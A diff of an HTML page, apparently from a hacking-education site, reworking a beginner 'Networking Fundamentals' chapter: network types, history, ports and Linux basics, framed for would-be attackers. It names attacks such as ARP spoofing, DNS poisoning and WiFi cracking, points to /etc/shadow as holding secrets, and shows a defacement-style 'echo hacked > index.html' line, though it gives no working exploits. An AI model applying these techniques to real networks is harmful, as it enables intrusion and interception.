@@ -3,331 +3,2262 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ch02: Deep Dive - Advanced Fundamentals - NullSector</title>
-    <link rel="stylesheet" href="styles.css">
-    <link rel="icon" href="favicon.ico">
-    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <title>Chapter 02: Networking Fundamentals - NullSector</title>
+    <link rel="icon" type="image/svg+xml" href="logo.svg">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #000; --bg2: #0a0a0a; --bg3: #111;
+            --text: #fff; --text2: #888; --text3: #555;
+            --border: rgba(255,255,255,0.1);
+        }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; overflow-x: hidden; }
+        .header { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); z-index: 1000; display: flex; align-items: center; padding: 0 2rem; }
+        .header-content { width: 100%; max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+        .brand { display: flex; align-items: center; gap: 0.75rem; text-decoration: none; color: var(--text); font-weight: 700; font-size: 1.25rem; }
+        .nav { display: flex; gap: 2rem; }
+        .nav a { color: var(--text2); text-decoration: none; font-size: 0.95rem; font-weight: 500; transition: color 0.3s; }
+        .nav a:hover { color: var(--text); }
+        .sidebar { position: fixed; left: 0; top: 70px; width: 280px; height: calc(100vh - 70px); background: var(--bg2); border-right: 1px solid var(--border); overflow-y: auto; padding: 2rem 0; z-index: 100; }
+        .sidebar::-webkit-scrollbar { width: 6px; }
+        .sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+        .sidebar-section { padding: 0 1.5rem; margin-bottom: 2rem; }
+        .sidebar-title { font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--text3); margin-bottom: 1rem; }
+        .sidebar-link { display: block; color: var(--text2); text-decoration: none; padding: 0.6rem 1rem; margin: 0.25rem 0; border-radius: 6px; font-size: 0.9rem; transition: all 0.3s; }
+        .sidebar-link:hover { background: rgba(255,255,255,0.05); color: var(--text); transform: translateX(4px); }
+        .sidebar-link.active { background: rgba(255,255,255,0.1); color: var(--text); font-weight: 600; }
+        .main { margin-left: 280px; margin-top: 70px; padding: 4rem 3rem; max-width: 1100px; }
+        .page-header { margin-bottom: 4rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border); }
+        .chapter-label { font-size: 0.875rem; font-weight: 600; text-transform: uppercase; letter-spacing: 2px; color: var(--text3); margin-bottom: 1rem; }
+        .page-title { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; letter-spacing: -1px; }
+        .page-subtitle { font-size: 1.25rem; color: var(--text2); font-weight: 400; line-height: 1.6; }
+        .section { margin-bottom: 6rem; scroll-margin-top: 100px; }
+        .section-title { font-size: 2.25rem; font-weight: 700; margin-bottom: 1.5rem; }
+        .section-intro { font-size: 1.125rem; color: var(--text2); margin-bottom: 2rem; line-height: 1.8; }
+        h3 { font-size: 1.75rem; font-weight: 600; margin: 3rem 0 1.5rem; }
+        p { font-size: 1.0625rem; line-height: 1.8; margin-bottom: 1.5rem; }
+        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
+        .card { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 2rem; transition: all 0.3s; }
+        .card:hover { transform: translateY(-4px); border-color: rgba(255,255,255,0.2); }
+        .card h4 { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; }
+        .card p { color: var(--text2); font-size: 0.9375rem; }
+        .info-box { background: var(--bg3); border-left: 3px solid var(--text); padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; }
+        .info-box h4 { font-weight: 600; margin-bottom: 0.75rem; }
+        .info-box p { color: var(--text2); }
+        .warning-box { background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-left: 3px solid var(--text2); padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; }
+        .code { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; line-height: 1.7; white-space: pre; }
+        .inline-code { background: rgba(255,255,255,0.1); padding: 0.2rem 0.5rem; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.875em; }
+        .metaphor-box { background: rgba(255,255,255,0.03); border-left: 4px solid var(--text); padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; position: relative; }
+        .metaphor-box::before { content: "💡"; position: absolute; top: 1rem; right: 1rem; font-size: 1.5rem; }
+        ul, ol { margin: 1.5rem 0; padding-left: 2rem; }
+        li { margin: 0.75rem 0; color: var(--text2); }
+        table { width: 100%; border-collapse: collapse; margin: 2rem 0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+        th, td { padding: 1rem; text-align: left; border-bottom: 1px solid var(--border); }
+        th { background: var(--bg2); font-weight: 600; font-size: 0.875rem; text-transform: uppercase; }
+        td { color: var(--text2); font-size: 0.9375rem; }
+        .progress { position: fixed; top: 70px; left: 0; height: 3px; background: linear-gradient(90deg, var(--text) 0%, var(--text2) 100%); transition: width 0.1s; z-index: 1001; }
+        @media (max-width: 1024px) { .sidebar { transform: translateX(-100%); } .main { margin-left: 0; padding: 3rem 2rem; } .page-title { font-size: 2.5rem; } }
+    </style>
 </head>
 <body>
-    <div class="stars"></div>
-    <div class="twinkling"></div>
-    
-    <nav class="navbar">
-        <div class="nav-container">
-            <div class="nav-brand">
-                <a href="index.html" style="display: flex; align-items: center; text-decoration: none; color: inherit;">
-                    <img src="logo.svg" alt="NullSector Logo" class="logo">
-                    <span class="brand-text">NullSector</span>
-                </a>
+    <div class="progress" id="progress"></div>
+    <header class="header">
+        <div class="header-content">
+            <a href="index.html" class="brand">
+                <img src="logo.svg" alt="NullSector" width="36" height="36">
+                <span>NullSector</span>
+            </a>
+            <nav class="nav">
+                <a href="roadmap-hacking.html">Hacking</a>
+                <a href="roadmap-programming.html">Programming</a>
+                <a href="index.html">Home</a>
+            </nav>
+        </div>
+    </header>
+
+    <aside class="sidebar">
+        <div class="sidebar-section">
+            <div class="sidebar-title">On This Page</div>
+            <a href="#what-is-network" class="sidebar-link">What is a Network?</a>
+            <a href="#osi-model" class="sidebar-link">OSI Model Explained</a>
+            <a href="#tcp-ip" class="sidebar-link">TCP/IP in Depth</a>
+            <a href="#ip-addresses" class="sidebar-link">IP Addresses</a>
+            <a href="#ports" class="sidebar-link">Ports & Services</a>
+            <a href="#dns" class="sidebar-link">DNS: The Phone Book</a>
+            <a href="#protocols" class="sidebar-link">Network Protocols</a>
+            <a href="#tools" class="sidebar-link">Networking Tools</a>
+        </div>
+        <div class="sidebar-section">
+            <div class="sidebar-title">Navigation</div>
+            <a href="hacking-ch03.html" class="sidebar-link">Next: Chapter 03 →</a>
+            <a href="hacking-ch01.html" class="sidebar-link">← Previous: Chapter 01</a>
+            <a href="roadmap-hacking.html" class="sidebar-link">Back to Roadmap</a>
+        </div>
+    </aside>
+
+    <main class="main">
+        <div class="page-header">
+            <div class="chapter-label">Chapter 02</div>
+            <h1 class="page-title">Networking Fundamentals</h1>
+            <p class="page-subtitle">Networks are the highways that connect every computer on Earth. To hack systems, you must understand how data travels - every packet, every protocol, every port.</p>
+        </div>
+
+        <section class="section">
+            <p>Every hack you'll ever perform involves a network. Whether you're exploiting a remote server, sniffing traffic on a WiFi network, or performing a man-in-the-middle attack, networking knowledge is non-negotiable. This isn't optional learning - it's the foundation that separates script kiddies from real hackers.</p>
+
+            <p>Think about it: when you browse a website, send an email, play an online game, or even just have your phone connected to WiFi - networking is happening. Data is flying through the air and cables at incredible speeds, following precise rules, getting routed through dozens of devices. <strong>Understanding this invisible world gives you power over it.</strong></p>
+
+            <p>This chapter will teach you how networks actually work - from the physical cables carrying electrical signals to the protocols that carry your data across the world. We'll go deep. By the end, you'll understand how every packet flows, where vulnerabilities exist, and how attackers exploit them.</p>
+
+            <div class="info-box">
+                <h4>Why This Matters for Hackers</h4>
+                <p>Network attacks are among the most powerful in your arsenal. Here's a taste of what networking knowledge enables:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>ARP Spoofing:</strong> Redirect traffic through your machine</li>
+                    <li><strong>DNS Poisoning:</strong> Hijack domain lookups to fake sites</li>
+                    <li><strong>Man-in-the-Middle:</strong> Intercept and modify communications</li>
+                    <li><strong>Port Scanning:</strong> Discover services running on targets</li>
+                    <li><strong>Packet Analysis:</strong> Capture and decode network traffic</li>
+                    <li><strong>Session Hijacking:</strong> Steal authenticated sessions</li>
+                    <li><strong>WiFi Cracking:</strong> Break into wireless networks</li>
+                    <li><strong>VLAN Hopping:</strong> Escape network segmentation</li>
+                </ul>
+                <p style="margin-top: 1rem;">Every single one of these requires deep networking knowledge. Master this chapter and you'll have the foundation for all of them.</p>
             </div>
-            <div class="nav-links">
-                <a href="roadmap-hacking.html" class="nav-link active">Hacking</a>
-                <a href="roadmap-programming.html" class="nav-link">Programming</a>
-                <a href="resources.html" class="nav-link">Resources</a>
-                <a href="faq.html" class="nav-link">FAQ</a>
-                <a href="https://discord.gg/Tz9Y3wea32" target="_blank" class="nav-link">Discord</a>
-            
-                                
-                <div id="userProfile" style="display: none; align-items: center; gap: 0.75rem;">
-                    <div style="display: flex; align-items: center; gap: 0.5rem;">
-                        <img id="userAvatar" style="width: 36px; height: 36px; border-radius: 50%; border: 2px solid var(--primary-color); cursor: pointer; transition: transform 0.2s;" onmouseover="this.style.transform='scale(1.1)'" onmouseout="this.style.transform='scale(1)'" title="" />
-                        <span id="userName" style="color: var(--text-primary); font-weight: 500; font-size: 0.95rem; cursor: default;"></span>
-                    </div>
-                    <button id="logoutButton" class="nav-link" style="background: rgba(255, 95, 87, 0.1); border: 1px solid #ff5f57; padding: 0.4rem 1rem; border-radius: 6px; font-weight: 500; cursor: pointer; color: #ff5f57; transition: all 0.2s;" onmouseover="this.style.background='rgba(255, 95, 87, 0.2)'" onmouseout="this.style.background='rgba(255, 95, 87, 0.1)'">Logout</button>
+
+            <div class="metaphor-box">
+                <h4>The Invisible Highway System</h4>
+                <p>Right now, as you read this, billions of data packets are racing through cables under the ocean, through radio waves in the air, bouncing off satellites in space. It's a massive, invisible highway system that spans the entire planet.</p>
+                <p style="margin-top: 1rem;">And here's the beautiful thing: <strong>this highway has no walls, no guards, no security checkpoints</strong>. If you understand how it works, you can:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Observe any traffic that passes near you</li>
+                    <li>Redirect traffic through your own machine</li>
+                    <li>Inject fake data into streams</li>
+                    <li>Impersonate any device on a network</li>
+                    <li>Find every service running on any connected computer</li>
+                </ul>
+                <p style="margin-top: 1rem;">The network is both the attack surface and the weapon. Master it.</p>
+            </div>
+
+            <h3>What You'll Learn</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>🌐 Network Fundamentals</h4>
+                    <p>What networks are, how they connect, the physical and logical components that make everything work.</p>
+                </div>
+                <div class="card">
+                    <h4>📊 The OSI Model</h4>
+                    <p>The 7 layers of networking - understand where data flows and where attacks happen at each layer.</p>
+                </div>
+                <div class="card">
+                    <h4>🔌 TCP/IP Deep Dive</h4>
+                    <p>How data actually travels on the internet, the handshakes, the protocols, the packet structure.</p>
+                </div>
+                <div class="card">
+                    <h4>📍 IP Addressing</h4>
+                    <p>IPv4, IPv6, subnetting, CIDR notation - the addressing system that locates every device.</p>
+                </div>
+                <div class="card">
+                    <h4>🚪 Ports & Services</h4>
+                    <p>How services listen for connections, port numbers you must memorize, service enumeration.</p>
+                </div>
+                <div class="card">
+                    <h4>🔧 Essential Tools</h4>
+                    <p>Nmap, Wireshark, tcpdump, arpspoof - the tools that let you see and manipulate networks.</p>
                 </div>
             </div>
-        </div>
-    </nav>
+        </section>
 
-    <section class="content-page">
-        <div class="content-container">
-            <div class="breadcrumb">
-                <a href="roadmap-hacking.html">Hacking Roadmap</a> / <span>Chapter 02</span>
+        <section id="what-is-network" class="section">
+            <h2 class="section-title">What is a Network?</h2>
+            <p class="section-intro">A network is simply two or more computers connected together so they can share information. That's it. The internet is just billions of computers connected in a massive network of networks. But understanding the "simple" definition isn't enough - you need to understand HOW they connect, WHY they connect the way they do, and WHERE the vulnerabilities exist.</p>
+
+            <div class="metaphor-box">
+                <h4>🛣️ The Highway System Metaphor</h4>
+                <p>Think of networks like roads connecting cities. This analogy will help you understand every networking concept:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Computers</strong> = Buildings in cities (destinations where people live/work)</li>
+                    <li><strong>Cables/WiFi</strong> = Roads and highways (physical paths for travel)</li>
+                    <li><strong>Routers</strong> = Highway interchanges that direct traffic between different road systems</li>
+                    <li><strong>Switches</strong> = Traffic lights in neighborhoods directing local traffic</li>
+                    <li><strong>Packets</strong> = Individual cars carrying cargo (data)</li>
+                    <li><strong>IP Addresses</strong> = Street addresses (unique location identifiers)</li>
+                    <li><strong>Ports</strong> = Apartment numbers in a building (specific destinations within an address)</li>
+                    <li><strong>MAC Addresses</strong> = License plates (unique hardware identifiers)</li>
+                    <li><strong>Protocols</strong> = Traffic laws everyone agrees to follow</li>
+                    <li><strong>Firewalls</strong> = Security checkpoints that check who can enter/exit</li>
+                </ul>
+                <p style="margin-top: 1rem;">When you send an email, it's like breaking your letter into many small pieces, putting each in a separate car, and each car finds its own route to the destination where they're reassembled! Some cars might take the highway, some might take back roads, some might arrive out of order - but they all get there eventually.</p>
             </div>
-            
-            <div class="roadmap-section">
-                <div class="roadmap-number">02</div>
-                <h1 class="page-title">Chapter 02: The Invisible World (Expanded)</h1>
-                <p class="page-subtitle">Networking, OS Architecture, Web, Crypto & The Hacker Mindset</p>
 
-                <div class="key-takeaways" style="margin-bottom:3rem;">
-                    <h3>The Mega-Checklist:</h3>
+            <h3>The Birth of Networks: A Brief History</h3>
+            <p>Understanding where networks came from helps you understand why they have the vulnerabilities they do:</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>1960s - ARPANET</h4>
+                    <p>The U.S. military wanted a network that could survive nuclear attack. They invented packet switching - breaking messages into pieces that can take different routes. <strong>Security wasn't a priority</strong> - it was a trusted military network.</p>
+                </div>
+                <div class="card">
+                    <h4>1970s - TCP/IP Born</h4>
+                    <p>Vinton Cerf and Bob Kahn created TCP/IP to connect different networks together. Again, designed for <strong>reliability, not security</strong>. Everyone on the network was trusted.</p>
+                </div>
+                <div class="card">
+                    <h4>1980s - DNS & Expansion</h4>
+                    <p>DNS was created so humans could use names instead of numbers. The internet expanded beyond military to universities. Still <strong>no encryption, no authentication</strong>.</p>
+                </div>
+                <div class="card">
+                    <h4>1990s - WWW & Commercialization</h4>
+                    <p>The web went public. Suddenly billions of untrusted users were on a network designed for trusted academics. <strong>Security was bolted on as an afterthought.</strong></p>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h4>Why Networks Are Insecure by Design</h4>
+                <p>The internet was designed when all users were trusted researchers and military personnel. There was no concept of:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Malicious actors trying to intercept data</li>
+                    <li>People impersonating others</li>
+                    <li>Fake servers pretending to be legitimate</li>
+                    <li>Denial of service attacks</li>
+                </ul>
+                <p style="margin-top: 1rem;">Every security measure today is a patch on a fundamentally trusting system. <strong>This is why hacking works.</strong></p>
+            </div>
+
+            <h3>Network Types</h3>
+            <p>Networks are categorized by their size, scope, and purpose. Each type has different security implications:</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>LAN - Local Area Network</h4>
+                    <p>Small network in one physical location. Your home WiFi, office network, school computer lab, coffee shop hotspot.</p>
+                    <p style="margin-top: 1rem;"><strong>Characteristics:</strong></p>
                     <ul>
-                        <li><strong>Networking:</strong> IP Addressing, Subnets, NAT, and the Packet Anatomy</li>
-                        <li><strong>The Web:</strong> HTTP Headers, Cookies, Sessions, and the URL Structure</li>
-                        <li><strong>Linux/OS:</strong> The File System Hierarchy, Pipes, Redirection, and Processes</li>
-                        <li><strong>Crypto & Encoding:</strong> Base64 vs Hex vs Hashing vs Encryption</li>
-                        <li><strong>Theory:</strong> The CIA Triad and Authentication vs Authorization</li>
+                        <li>High speed (100 Mbps - 10 Gbps)</li>
+                        <li>Low latency (< 1ms)</li>
+                        <li>Single administrative control</li>
+                        <li>Limited geographic area</li>
                     </ul>
+                    <p style="margin-top: 1rem;"><strong>Hacker interest:</strong> ARP spoofing, lateral movement, internal reconnaissance, credential sniffing, rogue DHCP attacks.</p>
                 </div>
-
-                <!-- Topic 1: Networking Deep Dive -->
-                <div class="topic-section" style="background: linear-gradient(135deg, rgba(0,255,136,0.05) 0%, rgba(0,204,255,0.05) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0;">
-                    <h2 style="color: #00ff88; font-size: 2.2rem; margin-bottom: 2rem;">1. Networking: The Nervous System</h2>
-                    
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 15px; margin: 2rem 0; font-size: 1.15rem; line-height: 1.9;">
-                        <p style="margin: 0; font-size: 1.25rem;">
-                            The internet is a web of pipes. If you want to break into a house, you need to know where the doors, windows, and vents are.
-                        </p>
-                    </div>
-
-                    <div style="display: grid; gap: 2rem; margin-top: 2rem;">
-                        <!-- IP Addressing -->
-                        <div style="background: rgba(0,255,136,0.1); padding: 2rem; border-radius: 10px; border-left: 4px solid #00ff88;">
-                            <h4 style="color: #00ff88; margin: 0 0 1rem 0; font-size: 1.6rem;">IP Addressing & NAT</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                Every device needs an address. But there are two types:
-                            </p>
-                            <ul style="font-size: 1.1rem; line-height: 1.8; margin-top: 1rem;">
-                                <li><strong>Public IP:</strong> Your house's address on the internet (e.g., <code>8.8.8.8</code>). Unique worldwide.</li>
-                                <li><strong>Private IP:</strong> Your laptop's address inside your house (e.g., <code>192.168.1.5</code>). Not unique. Millions of people use this same IP at home.</li>
-                                <li><strong>NAT (Network Address Translation):</strong> The Router's job. It translates your private requests into public ones. To the outside world, all devices in your house look like ONE IP.</li>
-                                <li><strong>Localhost:</strong> <code>127.0.0.1</code>. This means "Me". "There's no place like 127.0.0.1".</li>
-                            </ul>
-                        </div>
-
-                        <!-- Subnets -->
-                        <div style="background: rgba(0,204,255,0.1); padding: 2rem; border-radius: 10px; border-left: 4px solid #00ccff;">
-                            <h4 style="color: #00ccff; margin: 0 0 1rem 0; font-size: 1.6rem;">Subnets & CIDR (/24)</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                Networks are split into smaller chunks called Subnets. You'll see this notation everywhere: <code>192.168.1.0/24</code>.
-                            </p>
-                            <ul style="font-size: 1.1rem; line-height: 1.8; margin-top: 1rem;">
-                                <li><strong>/24:</strong> Means the first 3 parts (192.168.1) are fixed. The last part changes.</li>
-                                <li><strong>Range:</strong> <code>192.168.1.1</code> to <code>192.168.1.254</code>. (254 usable hosts).</li>
-                                <li><strong>Why hackers care:</strong> When you scan a network, you scan the subnet. "I'll scan 10.0.0.0/8" means scanning millions of IPs (loud). "I'll scan 192.168.1.0/24" means scanning 254 IPs (quiet).</li>
-                            </ul>
-                        </div>
-
-                        <!-- Ports -->
-                        <div style="background: rgba(255,200,0,0.1); padding: 2rem; border-radius: 10px; border-left: 4px solid #ffc800;">
-                            <h4 style="color: #ffc800; margin: 0 0 1rem 0; font-size: 1.6rem;">The Top 10 Ports</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                Memorize these. You will see them every day.
-                            </p>
-                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem; font-family: monospace; font-size: 1.1rem;">
-                                <div>21: FTP (File Transfer)</div>
-                                <div>22: SSH (Secure Shell)</div>
-                                <div>23: Telnet (Insecure SSH)</div>
-                                <div>25: SMTP (Email Sending)</div>
-                                <div>53: DNS (Domain Names)</div>
-                                <div>80: HTTP (Web)</div>
-                                <div>110: POP3 (Email Receiving)</div>
-                                <div>139/445: SMB (Windows Shares)</div>
-                                <div>443: HTTPS (Secure Web)</div>
-                                <div>3306: MySQL (Database)</div>
-                            </div>
-                        </div>
-                    </div>
+                <div class="card">
+                    <h4>WAN - Wide Area Network</h4>
+                    <p>Connects multiple LANs across cities, countries, or continents. The internet is the largest WAN. Corporate networks connecting branch offices are also WANs.</p>
+                    <p style="margin-top: 1rem;"><strong>Characteristics:</strong></p>
+                    <ul>
+                        <li>Variable speed</li>
+                        <li>Higher latency (10-100+ ms)</li>
+                        <li>Multiple administrative domains</li>
+                        <li>Uses leased lines, VPNs, internet</li>
+                    </ul>
+                    <p style="margin-top: 1rem;"><strong>Hacker interest:</strong> Remote attacks, BGP hijacking, ISP-level MITM, routing attacks.</p>
                 </div>
-
-                <!-- Topic 2: The Web -->
-                <div class="topic-section" style="background: linear-gradient(135deg, rgba(255,100,100,0.05) 0%, rgba(255,200,0,0.05) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0;">
-                    <h2 style="color: #ff6464; font-size: 2.2rem; margin-bottom: 2rem;">2. The Web: The Face of the Internet</h2>
-                    
-                    <div style="display: grid; gap: 2rem;">
-                        <!-- URL Anatomy -->
-                        <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; border-left: 4px solid #ff6464;">
-                            <h4 style="color: #ff6464; margin: 0 0 1rem 0; font-size: 1.6rem;">Anatomy of a URL</h4>
-                            <div style="background: rgba(255,100,100,0.1); padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace; font-size: 1.2rem;">
-                                https://www.example.com:8080/path/to/file?search=hacking#section2
-                            </div>
-                            <ul style="font-size: 1.1rem; line-height: 1.8;">
-                                <li><strong>Protocol:</strong> <code>https://</code> (How we talk)</li>
-                                <li><strong>Domain:</strong> <code>www.example.com</code> (Who we talk to)</li>
-                                <li><strong>Port:</strong> <code>:8080</code> (Which door to knock on - usually hidden)</li>
-                                <li><strong>Path:</strong> <code>/path/to/file</code> (Where the file is)</li>
-                                <li><strong>Query:</strong> <code>?search=hacking</code> (Parameters sent to the server - <strong>Attack Vector!</strong>)</li>
-                                <li><strong>Fragment:</strong> <code>#section2</code> (Scroll position - stays in browser)</li>
-                            </ul>
-                        </div>
-
-                        <!-- Cookies & Sessions -->
-                        <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; border-left: 4px solid #ffc800;">
-                            <h4 style="color: #ffc800; margin: 0 0 1rem 0; font-size: 1.6rem;">Cookies & Sessions</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                HTTP is <strong>Stateless</strong>. The server forgets you immediately after sending a page.
-                                <br>To remember you (keep you logged in), we use <strong>Cookies</strong>.
-                            </p>
-                            <ul style="font-size: 1.1rem; line-height: 1.8; margin-top: 1rem;">
-                                <li><strong>Cookie:</strong> A small text file the server gives your browser. "Here, hold this ID card."</li>
-                                <li><strong>Session ID:</strong> The random number on that ID card.</li>
-                                <li><strong>Session Hijacking:</strong> If a hacker steals your Session ID (Cookie), they <em>become</em> you. They don't need your password.</li>
-                            </ul>
-                        </div>
-                    </div>
+                <div class="card">
+                    <h4>WLAN - Wireless LAN</h4>
+                    <p>WiFi networks. Incredibly convenient but broadcast signals anyone nearby can intercept. Radio waves don't stop at walls.</p>
+                    <p style="margin-top: 1rem;"><strong>Characteristics:</strong></p>
+                    <ul>
+                        <li>No physical connection required</li>
+                        <li>Signal can be intercepted from distance</li>
+                        <li>Encryption varies (WEP→WPA2→WPA3)</li>
+                        <li>Susceptible to jamming</li>
+                    </ul>
+                    <p style="margin-top: 1rem;"><strong>Hacker interest:</strong> WiFi cracking (WPA2 handshakes), evil twin attacks, deauth attacks, KARMA attacks, PMKID capture.</p>
                 </div>
-
-                <!-- Topic 3: Linux & OS -->
-                <div class="topic-section" style="background: linear-gradient(135deg, rgba(0,204,255,0.05) 0%, rgba(138,43,226,0.05) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0;">
-                    <h2 style="color: #00ccff; font-size: 2.2rem; margin-bottom: 2rem;">3. Linux & OS: The Soul</h2>
-                    
-                    <p style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 2rem;">
-                        You cannot hack if you cannot use Linux. It is the OS of the internet.
-                    </p>
-
-                    <div style="display: grid; gap: 2rem;">
-                        <!-- File System -->
-                        <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; border-left: 4px solid #00ccff;">
-                            <h4 style="color: #00ccff; margin: 0 0 1rem 0; font-size: 1.6rem;">The File System Hierarchy</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                Windows has <code>C:\</code>. Linux has <code>/</code> (Root).
-                            </p>
-                            <ul style="font-size: 1.1rem; line-height: 1.8; margin-top: 1rem;">
-                                <li><code>/bin</code>: Binaries (Programs like ls, cat, ping).</li>
-                                <li><code>/etc</code>: Configuration files (Where the secrets live). <code>/etc/passwd</code>, <code>/etc/shadow</code>.</li>
-                                <li><code>/home</code>: User folders (like C:\Users).</li>
-                                <li><code>/var</code>: Variable data (Logs, Websites). <code>/var/log</code>, <code>/var/www/html</code>.</li>
-                                <li><code>/tmp</code>: Temporary files (Often used by hackers to store scripts because anyone can write here).</li>
-                            </ul>
-                        </div>
-
-                        <!-- Pipes & Redirection -->
-                        <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; border-left: 4px solid #8a2be2;">
-                            <h4 style="color: #8a2be2; margin: 0 0 1rem 0; font-size: 1.6rem;">The Power of the Shell</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                Linux tools are like Lego bricks. You connect them with <strong>Pipes (|)</strong>.
-                            </p>
-                            <div style="background: rgba(138,43,226,0.1); padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace; font-size: 1.1rem;">
-                                cat access.log | grep "password" | sort | uniq
-                            </div>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                1. Read the log.<br>
-                                2. Filter for lines containing "password".<br>
-                                3. Sort them alphabetically.<br>
-                                4. Remove duplicates.<br>
-                                <strong>Redirection (>):</strong> <code>echo "hacked" > index.html</code> (Overwrites the file).
-                            </p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Topic 4: Crypto & Encoding -->
-                <div class="topic-section" style="background: linear-gradient(135deg, rgba(138,43,226,0.05) 0%, rgba(255,100,100,0.05) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0;">
-                    <h2 style="color: #ff6464; font-size: 2.2rem; margin-bottom: 2rem;">4. Crypto & Encoding: The Code</h2>
-                    
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 15px; margin: 2rem 0; font-size: 1.15rem; line-height: 1.9;">
-                        <p style="margin: 0; font-size: 1.25rem;">
-                            <strong>CRITICAL:</strong> Encoding is NOT Encryption.
-                        </p>
-                    </div>
-
-                    <div style="display: grid; gap: 1.5rem; margin-top: 2rem;">
-                        <!-- Encoding -->
-                        <div style="background: rgba(0,255,136,0.1); padding: 1.5rem; border-radius: 8px; border-left: 3px solid #00ff88;">
-                            <h5 style="color: #00ff88; margin: 0 0 0.5rem 0; font-size: 1.4rem;">Encoding (No Key)</h5>
-                            <p style="font-size: 1.1rem; line-height: 1.7;">
-                                Changing data format so computers can read it. <strong>Anyone can decode it.</strong>
-                                <br><strong>Base64:</strong> Ends with <code>=</code>. Used for email attachments and basic auth. <code>SGVsbG8=</code>
-                                <br><strong>URL Encoding:</strong> <code>%20</code> for space. <code>%3C</code> for <code>&lt;</code>.
-                                <br><strong>Hex:</strong> <code>48 65 6c 6c 6f</code>.
-                            </p>
-                        </div>
-
-                        <!-- Hashing -->
-                        <div style="background: rgba(255,200,0,0.1); padding: 1.5rem; border-radius: 8px; border-left: 3px solid #ffc800;">
-                            <h5 style="color: #ffc800; margin: 0 0 0.5rem 0; font-size: 1.4rem;">Hashing (One-Way)</h5>
-                            <p style="font-size: 1.1rem; line-height: 1.7;">
-                                A fingerprint. Used for integrity and passwords.
-                                <br><strong>MD5:</strong> Old, broken. Fast.
-                                <br><strong>SHA-256:</strong> Standard. Secure.
-                                <br><strong>Bcrypt:</strong> Slow. Designed for passwords.
-                            </p>
-                        </div>
-
-                        <!-- Encryption -->
-                        <div style="background: rgba(255,100,100,0.1); padding: 1.5rem; border-radius: 8px; border-left: 3px solid #ff6464;">
-                            <h5 style="color: #ff6464; margin: 0 0 0.5rem 0; font-size: 1.4rem;">Encryption (Requires Key)</h5>
-                            <p style="font-size: 1.1rem; line-height: 1.7;">
-                                Scrambling data for confidentiality.
-                                <br><strong>AES:</strong> Symmetric (Same key). Used for WiFi (WPA2) and File Encryption.
-                                <br><strong>RSA:</strong> Asymmetric (Public/Private). Used for SSL/TLS and SSH.
-                            </p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Topic 5: Security Theory -->
-                <div class="topic-section" style="background: linear-gradient(135deg, rgba(0,204,255,0.05) 0%, rgba(0,255,136,0.05) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0;">
-                    <h2 style="color: #00ccff; font-size: 2.2rem; margin-bottom: 2rem;">5. Security Theory: The Mindset</h2>
-                    
